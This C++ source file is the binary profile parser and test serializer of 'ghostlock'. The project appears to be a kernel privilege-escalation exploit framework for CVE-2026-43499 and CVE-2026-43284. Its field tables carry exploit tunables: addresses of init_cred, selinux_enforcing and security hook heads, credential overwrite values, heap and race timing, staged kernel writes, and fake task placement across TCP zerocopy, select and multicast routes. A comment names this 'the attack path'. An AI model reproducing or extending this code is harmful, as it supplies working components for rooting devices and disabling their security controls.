#include "profile/binary.h"

#include "backend/cve_2026_43284/schema.hpp"
#include "backend/cve_2026_43499/schema.hpp"
#include "profile/document.hpp"

#include <cstring>
#include <iterator>
#include <string_view>
#include <type_traits>
#include <utility>

namespace ghostlock::binary_profile {
    namespace {
        /* Reinterpret one transport member as the wire's raw 64-bit record.
         * Signed members use two's complement; unsigned use the exact bits. */
        template<typename T>
        constexpr uint64_t to_raw(T value) noexcept {
            if constexpr (std::is_signed_v<T>) {
                return static_cast<uint64_t>(static_cast<int64_t>(value));
            } else {
                return static_cast<uint64_t>(value);
            }
        }

        template<typename T>
        constexpr T from_raw(uint64_t raw) noexcept {
            if constexpr (std::is_signed_v<T>) {
                return static_cast<T>(static_cast<int64_t>(raw));
            } else {
                return static_cast<T>(raw);
            }
        }

        /* v2 write field table: only the golden/equivalence test serializer
         * below uses it. Production parses v2 through profile::Schema, so the
         * device build compiles none of this. */
#if defined(GHOSTLOCK_ENABLE_V2_WRITER)
        /* One typed read/write pair over the transport struct. `has` is the
         * presence predicate: a PLAIN field is always present, an OPT field is
         * present only when its std::optional holds a value. This makes a
         * provided 0 distinct from an omitted field. */
        struct Field {
            std::string_view key;
            bool (*has)(const profile::kernel_offsets &);
            uint64_t (*load)(const profile::kernel_offsets &);
            void (*store)(profile::kernel_offsets &, uint64_t);
        };

#define PLAIN(key, member)                                                       \
    {                                                                            \
        key, [](const profile::kernel_offsets &o) { return true; },              \
                [](const profile::kernel_offsets &o) { return to_raw(o.member); },\
                [](profile::kernel_offsets &o, uint64_t r) {                    \
                    o.member = from_raw<decltype(o.member)>(r);                 \
                }                                                            \
    }
#define OPT(key, member)                                                         \
    {                                                                            \
        key, [](const profile::kernel_offsets &o) { return o.member.has_value(); },\
                [](const profile::kernel_offsets &o) {                          \
                    return o.member ? to_raw(*o.member) : uint64_t{0};          \
                },                                                           \
                [](profile::kernel_offsets &o, uint64_t r) {                    \
                    o.member = from_raw<                                           \
                        std::remove_reference_t<decltype(*o.member)>>(r);        \
                }                                                            \
    }

        constexpr Field kMeta[] = {
            PLAIN("kernel_major", meta.kernel_major),
            PLAIN("fallback_route", meta.fallback_route),
            PLAIN("safe_mode", meta.safe_mode),
                    /* Ancillary behavior gate (vivo vr.ko guard). */
            PLAIN("vr_guard", misc.vr_guard),
        };

        constexpr Field kTask[] = {
            PLAIN("prio", task.prio), PLAIN("normal_prio", task.normal_prio),
            PLAIN("sched_task_group", task.sched_task_group),
            PLAIN("pi_lock", task.pi_lock), PLAIN("pi_waiters", task.pi_waiters),
            PLAIN("pi_top_task", task.pi_top_task),
            PLAIN("pi_blocked_on", task.pi_blocked_on),
            PLAIN("pid", task.pid), PLAIN("tgid", task.tgid),
            PLAIN("atomic_flags", task.atomic_flags),
            PLAIN("real_cred", task.real_cred), PLAIN("cred", task.cred),
            PLAIN("comm", task.comm), PLAIN("tasks", task.tasks),
            PLAIN("seccomp", task.seccomp),
        };

        constexpr Field kCred[] = {
            PLAIN("copy_size", credential.copy_size),
            PLAIN("usage_offset", credential.usage_offset),
            PLAIN("usage_value", credential.usage_value),
            PLAIN("caps_offset", credential.caps_offset),
            PLAIN("caps_count", credential.caps_count),
            PLAIN("caps_value", credential.caps_value),
            PLAIN("ref_count", credential.ref_count),
            PLAIN("ref0_offset", credential.ref0_offset),
            PLAIN("ref1_offset", credential.ref1_offset),
            PLAIN("ref2_offset", credential.ref2_offset),
            PLAIN("ref3_offset", credential.ref3_offset),
            PLAIN("ref0_image", credential.ref0_image),
            PLAIN("ref1_image", credential.ref1_image),
            PLAIN("ref2_image", credential.ref2_image),
            PLAIN("ref3_image", credential.ref3_image),
        };

        constexpr Field kOffset[] = {
            PLAIN("init_task", offsets.init_task),
            PLAIN("init_cred", offsets.init_cred),
            PLAIN("empty_zero_page", offsets.empty_zero_page),
            PLAIN("root_task_group", offsets.root_task_group),
            PLAIN("selinux_enforcing", offsets.selinux_enforcing),
            PLAIN("selinux_blob_sizes", offsets.selinux_blob_sizes),
            PLAIN("security_hook_heads", offsets.security_hook_heads),
            PLAIN("slide_nfulnl_logger", offsets.slide_nfulnl_logger),
            PLAIN("slide_loggers_0_1", offsets.slide_loggers_0_1),
            PLAIN("slide_boot_id", offsets.slide_boot_id),
            /* Ancillary vr.ko guard: the tracepoint the vendor probe hangs off. */
            PLAIN("vr_sys_exit_tp", misc.vr_sys_exit_tp),
        };

        constexpr Field kKernel[] = {
            OPT("kernel_phys_load", misc.kernel_phys_load),
            OPT("kernel_phys_offset", misc.kernel_phys_offset),
            OPT("compact_waiter", misc.compact_waiter),
            OPT("kernelsnitch_collisions", misc.kernelsnitch_collisions),
            OPT("mm_struct_sz", misc.mm_struct_sz),
        };

        constexpr Field kExecCpus[] = {
            PLAIN("main", execution.recommended_main_cpu),
            PLAIN("consumer", execution.recommended_consumer_cpu),
        };

        constexpr Field kExecHeap[] = {
            PLAIN("prepare_max_attempts", execution.heap_prepare_max_attempts),
            PLAIN("prepare_timeout_ms", execution.heap_prepare_timeout_ms),
            PLAIN("kernelsnitch_timeout_ms",
                  execution.heap_kernelsnitch_timeout_ms),
        };

        constexpr Field kExecRace[] = {
            PLAIN("route_wait_ms", execution.race_route_wait_ms),
            PLAIN("route_done_timeout_ms", execution.race_route_done_timeout_ms),
            PLAIN("setup_settle_us", execution.race_setup_settle_us),
            PLAIN("state_poll_interval_us",
                  execution.race_state_poll_interval_us),
        };

        constexpr Field kExecStages[] = {
            PLAIN("w1_attempts", execution.w1_attempts),
            PLAIN("w1_settle_us", execution.w1_settle_us),
            PLAIN("w1_scratch_repair_attempts",
                  execution.w1_scratch_repair_attempts),
            PLAIN("w2_attempts", execution.w2_attempts),
            PLAIN("w2_settle_us", execution.w2_settle_us),
            PLAIN("w3_chain_rounds", execution.w3_chain_rounds),
            PLAIN("w3_attempts", execution.w3_attempts),
            PLAIN("w3_settle_us", execution.w3_settle_us),
        };

        constexpr Field kExecHandoff[] = {
            PLAIN("pre_dispatch_settle_ms",
                  execution.handoff_pre_dispatch_settle_ms),
            PLAIN("module_poll_attempts",
                  execution.handoff_module_poll_attempts),
            PLAIN("module_poll_interval_ms",
                  execution.handoff_module_poll_interval_ms),
            PLAIN("enforce_poll_attempts",
                  execution.handoff_enforce_poll_attempts),
            PLAIN("enforce_poll_interval_ms",
                  execution.handoff_enforce_poll_interval_ms),
        };

        constexpr Field kExecConsumer[] = {
            PLAIN("max_calls", execution.select_consumer_max_calls),
            PLAIN("burst_calls", execution.select_consumer_burst_calls),
        };

        /* Ancillary vr.ko guard layout: offsetof(struct tracepoint, funcs),
         * derived from the image's BTF. Not a kernel-version lookup. */
        constexpr Field kVrGuard[] = {
            PLAIN("tracepoint_funcs", misc.vr_tracepoint_funcs),
        };

        constexpr Field kRouteTcp[] = {
            PLAIN("attempts", execution.tcp_attempts),
            PLAIN("arm_sequence", execution.tcp_arm_sequence),
            PLAIN("post_receive_hold_iterations",
                  execution.tcp_post_receive_hold_iterations),
            /* TCP payload placement (required; presence enforced by the route). */
            OPT("payload_delta", geometry.tcp_payload_delta),
            OPT("chunk_bias", geometry.tcp_chunk_bias),
            OPT("fake_task_off", geometry.tcp_fake_task_off),
            OPT("cred_copy_off", geometry.tcp_cred_copy_off),
        };

        constexpr Field kRouteSelect[] = {
            OPT("waiter_shift", geometry.pselect_waiter_shift),
            OPT("compact_waiter", misc.compact_waiter),
            PLAIN("enter_delay_us", execution.select_enter_delay_us),
            PLAIN("timeout_us", execution.select_timeout_us),
        };

        constexpr Field kRouteMulticast[] = {
            OPT("waiter_off", geometry.mcast_waiter_off),
            OPT("buffer_size", geometry.mcast_buffer_size),
            OPT("task_offset", geometry.mcast_task_offset),
            OPT("lock_offset", geometry.mcast_lock_offset),
            /* Poison/walk repetition; 0 means "keep the route default". */
            PLAIN("attempts", mcast_attempts),
            PLAIN("arm_sequence", mcast_arm_sequence),
            PLAIN("arm_hold", mcast_arm_hold),
        };

        struct Section {
            std::string_view name;
            const Field *fields;
            size_t count;
        };

        constexpr Section kSections[] = {
            {"meta", kMeta, std::size(kMeta)},
            {"task_struct", kTask, std::size(kTask)},
            {"cred", kCred, std::size(kCred)},
            {"offset", kOffset, std::size(kOffset)},
            {"kernel", kKernel, std::size(kKernel)},
            {"execution.recommended_cpus", kExecCpus, std::size(kExecCpus)},
            {"execution.heap", kExecHeap, std::size(kExecHeap)},
            {"execution.race", kExecRace, std::size(kExecRace)},
            {"execution.stages", kExecStages, std::size(kExecStages)},
            {"execution.handoff", kExecHandoff, std::size(kExecHandoff)},
            {"execution.consumer", kExecConsumer, std::size(kExecConsumer)},
            {"route.tcp_zerocopy", kRouteTcp, std::size(kRouteTcp)},
            {"route.select_stack", kRouteSelect, std::size(kRouteSelect)},
            {"route.multicast_waiter", kRouteMulticast, std::size(kRouteMulticast)},
            {"vr_guard", kVrGuard, std::size(kVrGuard)},
        };
#undef PLAIN
#undef OPT
#endif

        const size_t kHeaderSize = 16;

        std::string_view route_section_name(uint8_t route) {
            switch (route) {
                case profile::kRouteTcpZerocopy:
                    return "route.tcp_zerocopy";
                case profile::kRouteSelectStack:
                    return "route.select_stack";
                case profile::kRouteMulticastWaiter:
                    return "route.multicast_waiter";
                default:
                    return {};
            }
        }

        uint64_t read_le(const uint8_t *bytes, size_t width) {
            uint64_t value = 0;
            for (size_t i = 0; i < width; i++) {
                value |= static_cast<uint64_t>(bytes[i]) << (8 * i);
            }
            return value;
        }

        /* v2 write helpers: used only by the golden/equivalence test writer
         * below, never by production (v2 is read-only there). */
#if defined(GHOSTLOCK_ENABLE_V2_WRITER)
        void write_le(uint8_t *bytes, uint64_t value, size_t width) {
            for (size_t i = 0; i < width; i++) {
                bytes[i] = static_cast<uint8_t>(value >> (8 * i));
            }
        }

        size_t present_count(const Section &section,
                             const profile::kernel_offsets &in) {
            size_t n = 0;
            for (size_t i = 0; i < section.count; i++) {
                if (section.fields[i].has(in)) n++;
            }
            return n;
        }
#endif

        int32_t parse_v2(std::string_view document, profile::kernel_offsets *out,
                         char *release_buf, size_t release_buf_cap,
                         component_ids *ids,
                         profile::Document *document_out,
                         ghostlock::backend::Cve2026_43284Profile *profile_43284_out) {
            const auto *bytes = reinterpret_cast<const uint8_t *>(document.data());
            const auto *end = bytes + document.size();
            if (document.size() < kHeaderSize) return -1;
            if (read_le(bytes, 4) != kMagic) return -1;
            if (read_le(bytes + 4, 2) != kVersion) return -1;
            const uint16_t terminal = static_cast<uint16_t>(read_le(bytes + 6, 2));
            const uint16_t backend = static_cast<uint16_t>(read_le(bytes + 8, 2));
            const uint16_t middleware = static_cast<uint16_t>(read_le(bytes + 10, 2));
            if (!terminal_known(terminal) || !backend_known(backend)) return -1;
            if (middleware > 0xff) return -1;
            const size_t release_length = static_cast<size_t>(read_le(bytes + 12, 2));
            if (kHeaderSize + release_length > document.size()) return -1;
            if (release_length + 1 > release_buf_cap) return -1;
            memcpy(release_buf, bytes + kHeaderSize, release_length);
            release_buf[release_length] = '\0';

            const uint8_t route = static_cast<uint8_t>(middleware & 0xff);
            /* The route is profile-controlled: an unresolved or unknown route
             * is rejected instead of being inferred. The 43284 backend has no
             * route (assessment §4.4), so for it kRouteAuto is a legal
             * "no route" value; every other backend still requires one. */
            const bool route_known =
                    route == profile::kRouteTcpZerocopy ||
                    route == profile::kRouteSelectStack ||
                    route == profile::kRouteMulticastWaiter;
            const bool route_less_43284 =
                    backend == kBackendCve202643284 && route == profile::kRouteAuto;
            if (!route_known && !route_less_43284) {
                return -1;
            }

            /* A2-3c-3: frame the whole wire into the neutral Document without
             * interpreting a field, then bind the 43499 owner Schema onto its
             * View and land that View on the frozen transport.
             *
             * Production is strict (design §2.5): any section the owner does
             * not declare, any key inside an owned section, and any unknown
             * route.* section make the whole document Rejected at startup
             * instead of being silently ignored. bind_document() drops
             * known-but-inactive route sections, so they stay allowed without
             * being merged. Tooling tolerance is reserved for offline tools;
             * the attack path must never run a partially understood profile. */
            profile::Document framed;
            framed.release.assign(release_buf, release_length);
            framed.terminal = terminal;
            framed.backend = backend;
            framed.middleware = middleware;

            const uint8_t *p = bytes + kHeaderSize + release_length;
            if (p + 2 > end) return -1;
            const size_t sections = static_cast<size_t>(read_le(p, 2));
            p += 2;
            for (size_t s = 0; s < sections; s++) {
                if (p + 1 > end) return -1;
                const size_t name_len = *p++;
                if (p + name_len + 4 > end) return -1;
                const std::string_view name(reinterpret_cast<const char *>(p),
                                            name_len);
                p += name_len;
                const size_t entries = static_cast<size_t>(read_le(p, 4));
                p += 4;
                profile::Section &framed_section = framed.append_section(name);
                for (size_t e = 0; e < entries; e++) {
                    if (p + 1 > end) return -1;
                    const size_t key_len = *p++;
                    if (p + key_len + 8 > end) return -1;
                    const std::string_view key(reinterpret_cast<const char *>(p),
                                               key_len);
                    const uint64_t raw = read_le(p + key_len, 8);
                    p += key_len + 8;
                    framed_section.add(key, raw);
                }
            }

            return bind_document(std::move(framed), route, terminal, backend,
                                 middleware, out, release_buf, release_buf_cap,
                                 ids, document_out, profile_43284_out);
        }
    } // namespace

    int32_t bind_document(profile::Document &&document, uint8_t route,
                          uint16_t terminal, uint16_t backend,
                          uint16_t middleware, profile::kernel_offsets *out,
                          char *release_buf, size_t release_buf_cap,
                          component_ids *ids, profile::Document *document_out,
                          ghostlock::backend::Cve2026_43284Profile *profile_43284_out) {
        if (!out || !release_buf) return -1;
        if (!terminal_known(terminal) || !backend_known(backend)) return -1;
        if (middleware > 0xff) return -1;
        const bool route_known =
                route == profile::kRouteTcpZerocopy ||
                route == profile::kRouteSelectStack ||
                route == profile::kRouteMulticastWaiter;
        const bool route_less_43284 =
                backend == kBackendCve202643284 && route == profile::kRouteAuto;
        if (!route_known && !route_less_43284) return -1;
        if (document.release.size() + 1 > release_buf_cap) return -1;

        /* Only the document's own route section is materialised; the other
         * known route sections are dropped exactly as the legacy field walk
         * skipped them. Unknown sections stay in for the mode to judge. */
        profile::Document active;
        active.release = document.release;
        active.terminal = document.terminal;
        active.backend = document.backend;
        active.middleware = document.middleware;
        const std::string_view active_route = route_section_name(route);
        for (const profile::Section &section : document.sections) {
            const bool known_route = section.name == "route.tcp_zerocopy" ||
                                     section.name == "route.select_stack" ||
                                     section.name == "route.multicast_waiter";
            if (known_route && section.name != active_route) continue;
            active.sections.push_back(section);
        }

        /* S3 B4: the 43284 backend carries its policy in its own section. It is
         * accepted only for backend id 6; for any other backend the section
         * stays in `active` and the strict 43499 bind below rejects it as
         * UnknownSection. Binding here is fail-closed: an unknown key inside the
         * section rejects the whole document. The bound View is backend-private
         * and never enters CoreSession. */
        ghostlock::backend::Cve2026_43284Profile profile_43284{};
        if (backend == kBackendCve202643284) {
            profile::Document owned_43284;
            owned_43284.release = active.release;
            owned_43284.terminal = active.terminal;
            owned_43284.backend = active.backend;
            owned_43284.middleware = active.middleware;
            for (auto it = active.sections.begin(); it != active.sections.end();) {
                if (it->name == ghostlock::backend::kCve2026_43284Section) {
                    owned_43284.sections.push_back(*it);
                    it = active.sections.erase(it);
                } else {
                    ++it;
                }
            }
            const profile::BindStatus status_43284 =
                    profile::bind<ghostlock::backend::Cve2026_43284Schema>(
                            owned_43284, profile_43284,
                            profile::DecodeMode::Production);
            if (!status_43284.ok()) return -1;
        }

        backend::Cve2026_43499View view{};
        const profile::BindStatus status =
                profile::bind<backend::Cve2026_43499Schema>(
                        active, view, profile::DecodeMode::Production);
        if (!status.ok()) return -1;

        memcpy(release_buf, document.release.data(), document.release.size());
        release_buf[document.release.size()] = '\0';

        *out = view.values;
        out->uname_r = release_buf;
        out->route = route;
        /* The backend-private StepSet id: 43284 uses its own section. */
        uint16_t steps = view.steps;
        if (backend == kBackendCve202643284 && profile_43284.steps) {
            steps = *profile_43284.steps;
        }
        document.steps = steps;
        if (ids) *ids = {terminal, backend, middleware, steps};
        if (profile_43284_out) *profile_43284_out = profile_43284;
        if (document_out) *document_out = std::move(document);
        return 0;
    }

    int32_t parse(std::string_view document, profile::kernel_offsets *out,
                  char *release_buf, size_t release_buf_cap, component_ids *ids,
                  profile::Document *document_out,
                  ghostlock::backend::Cve2026_43284Profile *profile_43284_out) {
        if (!out || !release_buf || document.size() < kHeaderSize) return -1;
        return parse_v2(document, out, release_buf, release_buf_cap, ids,
                        document_out, profile_43284_out);
    }

#if defined(GHOSTLOCK_ENABLE_V2_WRITER)
    /* Golden/equivalence host tests only: production writes GLKv3 and v2 is
     * read-only on device. Kept so `native-doc-golden.sha256`,
     * `NativeDocumentEquivalenceTest` and `profile_v3_test`'s v2<->v3
     * equivalence can still pin the frozen v2 bytes. */
    int32_t serialize(const profile::kernel_offsets *in, char *buffer,
                      size_t capacity) {
        if (!in || !buffer || !in->uname_r) return -1;
        if (in->route == profile::kRouteAuto) return -1;
        const size_t release_length = strlen(in->uname_r);
        if (release_length > 0xffff) return -1;

        /* Sections with at least one present field, and their byte cost. */
        const Section *emitted[std::size(kSections)];
        size_t emitted_count = 0;
        size_t total = kHeaderSize + release_length + 2;
        for (const Section &section: kSections) {
            /* Only the active route's section is written. */
            if (section.name.starts_with("route.") &&
                section.name != route_section_name(in->route)) {
                continue;
            }
            const size_t n = present_count(section, *in);
            if (n == 0) continue;
            emitted[emitted_count++] = &section;
            total += 1 + section.name.size() + 4;
            for (size_t i = 0; i < section.count; i++) {
                if (!section.fields[i].has(*in)) continue;
                total += 1 + section.fields[i].key.size() + 8;
            }
        }
        if (total > capacity) return -1;

        auto *bytes = reinterpret_cast<uint8_t *>(buffer);
        memset(bytes, 0, kHeaderSize);
        write_le(bytes, kMagic, 4);
        write_le(bytes + 4, kVersion, 2);
        write_le(bytes + 6, kTerminalRootChild, 2);
        write_le(bytes + 8, kBackendCve202643499, 2);
        write_le(bytes + 10, in->route, 2);
        write_le(bytes + 12, release_length, 2);
        memcpy(bytes + kHeaderSize, in->uname_r, release_length);

        uint8_t *p = bytes + kHeaderSize + release_length;
        write_le(p, emitted_count, 2);
        p += 2;
        for (size_t s = 0; s < emitted_count; s++) {
            const Section &section = *emitted[s];
            *p++ = static_cast<uint8_t>(section.name.size());
            memcpy(p, section.name.data(), section.name.size());
            p += section.name.size();
            write_le(p, present_count(section, *in), 4);
            p += 4;
            for (size_t i = 0; i < section.count; i++) {
                const Field &field = section.fields[i];
                if (!field.has(*in)) continue;
                *p++ = static_cast<uint8_t>(field.key.size());
                memcpy(p, field.key.data(), field.key.size());
                p += field.key.size();
                write_le(p, field.load(*in), 8);
                p += 8;
            }
        }
        return static_cast<int32_t>(p - bytes);
    }
#endif
} // namespace ghostlock::binary_profile
